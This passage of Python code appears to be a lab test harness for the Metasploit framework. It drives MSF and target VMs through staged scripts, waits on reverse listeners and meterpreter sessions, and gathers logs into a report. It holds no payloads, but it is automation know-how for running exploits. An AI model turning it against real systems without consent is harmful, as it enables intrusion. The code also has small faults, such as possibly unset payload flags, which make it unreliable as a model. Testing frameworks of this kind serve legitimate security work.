    if not waitForHttpServer(testConfig['MSF_HOSTS'], testConfig['LOG_FILE'], testConfig['HTTP_PORT']):
        logMsg(testConfig['LOG_FILE'], "FAILED waitForHttpServer")
        return False
    if not waitForMsfPayloads(testConfig['MSF_HOSTS'], testConfig['REPORT_DIR'], testConfig['LOG_FILE'], timeoutSeconds):
        logMsg(testConfig['LOG_FILE'], "FAILED waitForMsfPayloads")
        return False

    """
    STAGE TWO STUFF
    """
    terminationToken = "!!! STAGE TWO COMPLETE !!!"
    stageTwoResults = launchStageTwo(testConfig, terminationToken, 180)
    if not stageTwoResults[0]:
        logMsg(testConfig['LOG_FILE'], "FAILED launchStageTwo")
        return False
    else:
        stageTwoNeeded = stageTwoResults[1]
        stageThreeNeeded = stageTwoResults[2]
    
    """
    IF WE LAUNCHED STAGE TWO, WAIT FOR THE SCRIPTS TO COMPLETE
    """
    if stageTwoNeeded:
        if not finishStageTwo(testConfig, terminationToken):
            logMsg(testConfig['LOG_FILE'], "FAILED finishStageTwo")
            return False
    else:
        logMsg(testConfig['LOG_FILE'], "NO STAGE TWO REQUIRED")


    """
    MAKE STAGE THREE SCRIPT TO RUN BIND HANDLERS ON MSF HOSTS
    """
    if stageThreeNeeded:
        if not launchStageThree(testConfig):
            logMsg(testConfig['LOG_FILE'], "FAILED launchStageThree")
            return False
        else:
            logMsg(testConfig['LOG_FILE'], "WAITING FOR MSFCONSOLES TO LAUNCH...")
            time.sleep(20)
    else:
        logMsg(testConfig['LOG_FILE'], "NO STAGE THREE SCRIPTS NEEDED")
        
    """
    WAIT FOR THE METERPRETER SESSIONS TO FINISH....
    """
    waitForMeterpreters(testConfig, sessionCounter)

    """
    PULL STAGE THREE LOG FILES FROM MSF VMS
    """
    if stageThreeNeeded:
        for msfHost in testConfig['MSF_HOSTS']:
            remoteFileName = msfHost['STAGE_THREE_LOGFILE']
            localFileName = testConfig['REPORT_DIR'] + '/' + msfHost['NAME'] + "_stageThreeLog.txt"
            msfHost['VM_OBJECT'].getFileFromGuest(remoteFileName, localFileName)
    else:
        logMsg(testConfig['LOG_FILE'], "NO STAGE THREE LOGFILES")
        
    """
    PULL REPORT FILES FROM EACH TEST VM
    """
    pullTargetLogs(testConfig)
    logMsg(testConfig['LOG_FILE'], "FINISHED DOWNLOADING REPORTS")
    
    """
    GET COMMIT VERSION, PCAPS, AND OTHER LOGS FROM MSF HOSTS
    """
    pullMsfLogs(testConfig)
    
    """
    CHECK TEST RESULTS
    """
    testResult = checkData(testConfig)
    
    """
    GENERATE HTML REPORT
    """
    htmlReportString = makeHtmlReport(testConfig['TARGETS'], testConfig['MSF_HOSTS'])
    htmlFileName = testConfig['REPORT_DIR'] + "/" + testConfig['REPORT_PREFIX'] + ".html"
    try:
        fileObj = open(htmlFileName, 'w')
        fileObj.write(htmlReportString)
        fileObj.close()
    except IOError as e:
        logMsg(testConfig['LOG_FILE'], "FAILED TO OPEN " + htmlFileName)
        logMsg(testConfig['LOG_FILE'], "SYSTEM ERROR: \n" + str(e))
    return testResult


def selectVms(vmList, posFilter=None):
    menuVms = []
    selectedVmList = []
    for i in vmList:
        if (posFilter == None) or (posFilter.upper() in i.vmIdentifier.upper()):
            menuVms.append(i)
    for i in range(len(menuVms)):
            print(str(i) + " " + menuVms[i].vmIdentifier)
    feedBack = raw_input(">> ")
    print("SELECTION: " + feedBack +'\n')
    feedbackList = feedBack.split(',')
    for i in feedbackList:
        selectedVmList.append(menuVms[int(i)])
    return selectedVmList


def setupSessionData(testConfig):
    for target in testConfig['TARGETS']:
        logMsg(testConfig['LOG_FILE'], str(target))
        if 'MODULES' not in target:
            logMsg(testConfig['LOG_FILE'], "CONFIG FILE DID NOT HAVE MODULES LISTED FOR " + target['NAME'] + ".  NOTHING TO TEST?")
            return False
        for module in target['MODULES']:
            logMsg(testConfig['LOG_FILE'], str(module))
            if 'exploit' in module['NAME'].lower():
                for payload in target['PAYLOADS']:
                    logMsg(testConfig['LOG_FILE'], str(payload))
                    tempDic = {}
                    tempDic['MODULE'] = module.copy()
                    tempDic['PAYLOAD'] = payload.copy()
                    target['SESSION_DATASETS'].append(tempDic)
            else:
                tempDic = {}
                tempDic['MODULE'] = module.copy()
                target['SESSION_DATASETS'].append(tempDic)
    return True


def setVmIPs(testConfig):
    for host in testConfig['MSF_HOSTS'] + testConfig['TARGETS']:
        if host['TYPE'].upper() == 'VIRTUAL' and 'IP_ADDRESS' not in host and 'VM_OBJECT' in host:
            host['IP_ADDRESS'] = host['VM_OBJECT'].getVmIp()
        if 'IP_ADDRESS' not in host:
            return False
    return True


def verifyConfig(jsonDic):
    """
    CHECK MAIN LEVEL FOR REQUIRED DATA
    """
    configPassed = True
    requiredList = []
    requiredList.append("FRAMEWORK_BRANCH")
    requiredList.append("HTTP_PORT")
    requiredList.append("STARTING_LISTENER")
    requiredList.append("MSF_HOSTS")
    requiredList.append("TARGETS")
    requiredList.append("SUCCESS_LIST")
    for item in requiredList:
        if item not in jsonDic:
            print("MISSING " + item + " IN CONFIGURATION FILE\n")
            configPassed = False
    if not configPassed:
        return False
    
    """
    MSF_HOSTS
    """
    requiredMsfData = []
    requiredMsfData.append("MSF_ARTIFACT_PATH")
    requiredMsfData.append("TYPE")
    requiredMsfData.append("METHOD")
    requiredMsfData.append("NAME")
    for requiredData in requiredMsfData:
        for msfHost in jsonDic['MSF_HOSTS']:
            if requiredData not in  msfHost:
                print("NO " + requiredData + " LISTED FOR MSF_HOST IN CONFIG FILE")
                configPassed = False
    if not configPassed:
        return False
    """
    SPECIFIC FOR TARGETS
    """
    for target in jsonDic['TARGETS']:
        requiredTargetData = []
        requiredTargetData.append("TYPE")
        requiredTargetData.append("NAME")
        if target['METHOD'] == 'EXPLOIT':
            requiredTargetData.append("NAME")
            if target['TYPE'] != 'VIRTUAL':
                requiredTargetData.append("IP_ADDRESS")
        if target['METHOD'] == "VM_TOOLS":
            requiredTargetData.append("USERNAME")
            requiredTargetData.append("PASSWORD")
            requiredTargetData.append("HYPERVISOR_CONFIG")
            requiredTargetData.append("PAYLOAD_DIRECTORY")
            for payload in jsonDic['PAYLOADS']:
                if 'java' in payload['NAME'].lower():
                    hasJavaPayload = True
                    break
                if 'python' in payload['NAME'].lower():
                    hasPythonPayload = True
                    break
            if hasJavaPayload:
                requiredTargetData.append("METERPRETER_JAVA")
            if hasPythonPayload:
                requiredTargetData.append("METERPRETER_PYTHON")
        for requiredItem in requiredTargetData:
            if requiredItem not in target:
                print("NO " + requiredItem + " LISTED FOR " + target['NAME'] + " IN " + jsonDic)
                configPassed = False
        if not configPassed:
            return False
    return True


def waitForHttpServer(msfHosts, logFile, httpPort):
    """
    WAIT FOR THE STAGE ONE SCRIPT TO FINISH....
    
    THERE ARE TWO PARTS TO DETECT THE COMPLETION OF STAGE ONE SCRIPTS:
    THE LAST INSTRUCTION IN THE STAGE ONE SCRIPT IS TO START AN HTTP SERVER TO PROVIDE PAYLOADS, SO WE WAIT UNTIL 
    THE HTTP PROCESS APPEARS.  UNFORUNATELY, MSFCONSOLE TAKES SEVERAL SECONDS TO START.  TO MAKE SURE WE DO NOT 
    LAUNCH THE REVERSE PAYLOADS BEFORE THE REVERSE HANDLERS ARE READY, THE REMOTE STAGE ONE SCRIPT HAS A FOR LOOP 
    WHERE IT DUMPS THE NETSTAT OUTPUT CONTAINING THE LISTENING PORT DATA TO A FILE. THIS SCRIPT PULLS THAT FILE 
    EVERY 5 SECONDS AFTER IT SEES THAT THE HTTP SERVER STARTED AND CHECKS TO SEE IF THE REVERSE LISTENERS HAVE STARTED.
    ONCE THOSE LISTENERS HAVE STARTED, WE MOVE TO STAGE 2.    
    """
    
    """
    WAIT FOR HTTP SERVERS TO START ON MSF_VMs
    """
    logMsg(logFile, "WAITING FOR STAGE ONE SCRIPT(S) TO COMPLETE...")
    modCounter = 0
    for host in msfHosts:
        host['SCRIPT_COMPLETE'] = False
    scriptComplete = False
    while scriptComplete == False:
        modCounter = modCounter + 1
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            return False
        scriptComplete = True
        for host in msfHosts:
            if host['SCRIPT_COMPLETE'] == False:
                scriptComplete = False
                if modCounter % 5 == 0:
                    logMsg(logFile, "WAITING FOR PYTHON HTTP SERVER TO START ON " + host['NAME'])
                host['VM_OBJECT'].updateProcList()
                for procEntry in host['VM_OBJECT'].procList:
                    if ('python' in procEntry.lower()) and (str(httpPort) in procEntry):
                        logMsg(logFile, "PYTHON HTTP SERVER FOUND ON " + host['NAME'])
                        logMsg(logFile, str(procEntry))
                        host['SCRIPT_COMPLETE'] = True
    return True


def waitForMeterpreters(testConfig, sessionCounter, timeoutSec = 500):
    modCounter = 0
    previousCount = 0
    currentCount = 0
    staticCount = 0
    finishedSpawning = False
    try:
        for i in range(timeoutSec/10):
            if finishedSpawning and staticCount > 15:
                break
            previousCount = currentCount
            currentCount = 0
            for msfHost in testConfig['MSF_HOSTS']:
                msfHost['VM_OBJECT'].updateProcList()
                msfConsoleCount = 0
                for procEntry in msfHost['VM_OBJECT'].procList:
                    if 'msfconsole' in procEntry:
                        msfConsoleCount = msfConsoleCount + 1
                currentCount = currentCount + msfConsoleCount
                logMsg(testConfig['LOG_FILE'], str(msfConsoleCount) + " msfconsole PROCESSES STILL RUNNING ON " + msfHost['NAME'])
            logMsg(testConfig['LOG_FILE'], "CURRENT COUNT [" + str(currentCount) +"]")
            logMsg(testConfig['LOG_FILE'], "PREVIOUS COUNT [" + str(previousCount) +"]")
            if currentCount < previousCount:
                finishedSpawning = True
            if currentCount == previousCount:
                logMsg(testConfig['LOG_FILE'], "NO CHANGE IN METERPRETER PROCESS COUNT [" + str(staticCount) +"]")
                staticCount = staticCount + 1
            else:
                staticCount = 0
            time.sleep(5)
            if currentCount == 0:
                break
    except KeyboardInterrupt:
        print("CAUGHT KEYBOARD INTERRUPT; SKIPPING THE NORMAL WAIT BUT PROCESSING THE DATA AND REVERTING VMS")
    return None


def waitForMsfPayloads(msfHosts, reportDir, logFile, timeoutSec = 300):
    """
    HTTP SERVERS HAVE STARTED; CHECK NETSTAT LOGS TO ENSURE ALL REQUIRED PORTS ARE LISTENING
    """
    for waitCycles in range(timeoutSec/5):
        stageTwoComplete = True
        try:
            logMsg(logFile, "CHECKING netstat OUTPUT")
            for host in msfHosts:
                remoteFile = host['MSF_PAYLOAD_PATH'] + "/netstat.txt"
                hostReady = True
                if 0 == len(host['LISTEN_PORTS']):
                    logMsg(logFile, "NO PORTS REQUIRED FOR " + host['NAME'] + "\n")
                    host['READY'] = True
                if 'READY' in host and host['READY'] == True:
                    logMsg(logFile, "ALL REQUIRED PORTS READY ON " + host['NAME'] + "\n")
                else:
                    logMsg(logFile, "PORT " + str(host['LISTEN_PORTS']) + " SHOULD BE OPEN ON " + host['NAME'] + "\n")
                    localFile = reportDir + "/" + host['NAME'] + "_netstat_" + str(waitCycles) + ".txt"
                    host['VM_OBJECT'].getFileFromGuest(remoteFile, localFile)
                    try:
                        netstatFile = open(localFile, 'r')
                        netstatData = netstatFile.read()
                        netstatFile.close()
                    except Exception as e:
                        logMsg(logFile, "FAILED READING NETSTAT FILE: " + localFile + "\n" + str(e))
                        # IF WE DID NOT GET A  FILE, WE CANNOT SAY THAT THE PORTS ARE READY
                        netstatData = ""
                        pass
                    for port in host['LISTEN_PORTS']:
                        if str(port) not in netstatData:
                            hostReady = False
                            logMsg(logFile, "PORT " + str(port) + " NOT OPEN ON " + host['NAME'] + "\n")
                        else:
                            logMsg(logFile, "PORT " + str(port) + " IS OPEN ON " + host['NAME'] + "\n")
                    if hostReady == False:
                        stageTwoComplete = False
                    else:
                        host['READY'] = True
            if stageTwoComplete == True:
                break;    
            time.sleep(5)
        except KeyboardInterrupt:
            print("CAUGHT KEYBOARD INTERRUPT; ABORTING TEST AND RESETTING VMS....")
            return False
    waitCycles = 3
    for i in range(waitCycles):
        logMsg(logFile, "SLEEPING FOR " + str((waitCycles-i)*10) + " SECONDS")
        try:
            time.sleep(5)
        except KeyboardInterrupt:
            print("CAUGHT KEYBOARD INTERRUPT; ABORTING TEST AND RESETTING VMS....")
            return False
    return True


def waitForVms(vmList):
    """
    WAIT FOR THE VMS TO BE READY.
    THIS RELIES ON VMWARE_TOOLS TO BE INSTALLED AND RUNNING.
    """
    for vmObject in vmList:
        if vmObject.waitForVmToBoot() == False:
            return False
    return True


def __matchListToCatalog(vm_List, catalog_file, logFile="default.log"):
    my_catalog = SystemCatalog(catalog_file)
    defined_vms = []
    for vm in vm_List:
        if 'CPE' in vm:
            local_target = my_catalog.findByCPE(vm['CPE'])
        elif 'OS' in vm:
            local_target = my_catalog.findByOS(vm['OS'])
        else:
            local_target = my_catalog.findByName(vm['NAME'])
        if local_target is not None:
            final_vm = vm.copy()
            final_vm.update(local_target)
        else:
            final_vm = vm
        if "USERNAME" not in final_vm:
            logMsg(logFile, "NO USERNAME FOR " + str(vm))
            return False
        if "PASSWORD" not in final_vm:
            logMsg(logFile, "NO PASSWORD FOR " + str(vm))
            return False
        defined_vms.append(final_vm)
    return defined_vms
